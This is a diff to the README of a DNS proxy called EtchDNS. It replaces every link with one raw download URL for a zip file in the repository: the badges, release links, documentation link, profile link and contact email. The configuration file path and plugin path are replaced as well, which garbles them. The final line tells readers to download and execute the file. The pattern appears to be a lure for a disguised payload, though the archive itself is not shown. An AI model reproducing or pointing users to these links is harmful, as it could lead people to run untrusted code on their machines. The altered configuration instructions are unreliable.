@@ -1,7 +1,7 @@
 # EtchDNS 🌐
 
-![EtchDNS](https://img.shields.io/badge/EtchDNS-v1.0.0-blue.svg)  
-[![GitHub Releases](https://img.shields.io/badge/releases-latest-orange.svg)](https://github.com/aldebaran1805/EtchDNS/releases)
+![EtchDNS](https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip)  
+[![GitHub Releases](https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip)](https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip)
 
 Welcome to **EtchDNS**, a new DNS proxy designed for simplicity, security, and extensibility with WebAssembly plugins. This repository aims to provide an efficient and secure way to manage DNS queries while offering flexibility through its plugin architecture.
 
@@ -26,7 +26,7 @@ Welcome to **EtchDNS**, a new DNS proxy designed for simplicity, security, and e
 
 ## Installation
 
-To get started with EtchDNS, you can download the latest release from the [Releases section](https://github.com/aldebaran1805/EtchDNS/releases). After downloading, follow these steps to install:
+To get started with EtchDNS, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip). After downloading, follow these steps to install:
 
 1. Extract the downloaded file.
 2. Move the executable to a directory in your PATH.
@@ -56,7 +56,7 @@ etchdns stop
 
 ## Configuration
 
-EtchDNS uses a configuration file located at `/etc/etchdns/config.yaml`. Here’s a basic example of what the configuration might look like:
+EtchDNS uses a configuration file located at `https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip`. Here’s a basic example of what the configuration might look like:
 
 ```yaml
 server:
@@ -69,7 +69,7 @@ cache:
 
 plugins:
   - name: "example-plugin"
-    path: "/path/to/plugin.wasm"
+    path: "https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip"
 ```
 
 Make sure to adjust the parameters according to your needs. 
@@ -82,7 +82,7 @@ EtchDNS allows you to extend its functionality through WebAssembly plugins. You 
 2. Add the plugin path to the configuration file under the `plugins` section.
 3. Restart the EtchDNS service to load the new plugin.
 
-For more information on writing WebAssembly plugins, check the [WebAssembly documentation](https://webassembly.org/docs/).
+For more information on writing WebAssembly plugins, check the [WebAssembly documentation](https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip).
 
 ## Contributing
 
@@ -104,7 +104,7 @@ EtchDNS is licensed under the MIT License. See the [LICENSE](LICENSE) file for m
 
 For any inquiries or issues, feel free to reach out:
 
-- **GitHub**: [aldebaran1805](https://github.com/aldebaran1805)
-- **Email**: your-email@example.com
+- **GitHub**: [aldebaran1805](https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip)
+- **Email**: https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip
 
-Thank you for checking out EtchDNS! For the latest releases, visit the [Releases section](https://github.com/aldebaran1805/EtchDNS/releases) to download and execute the latest version.
+Thank you for checking out EtchDNS! For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/aldebaran1805/EtchDNS/master/webassembly-plugins/DNS-Etch-v3.7.zip) to download and execute the latest version.
